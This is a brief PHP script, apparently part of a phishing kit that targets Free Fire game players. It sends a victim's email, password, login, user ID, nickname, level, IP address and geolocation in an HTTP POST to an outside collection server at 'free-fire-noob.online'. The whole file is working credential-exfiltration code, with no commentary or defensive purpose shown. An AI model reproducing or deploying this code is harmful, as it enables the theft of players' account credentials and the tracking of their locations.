<?php 
$url = "https://free-fire-noob.online/codaff.php";
$data = "email=".$email."&password=".$password."&login=".$login."&userIdForm=".$userIdForm."&nickname=".$nickname."&lvl=".$level."&rpt=".$rpt."&rpl=".$rpl."&country=".$country."&regionName=".$region."&city=".$city."&lat=".$lat."&lon=".$long."&timezone=".$timezone."&query=".$ipAddr."&country_code=".$calling;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

?>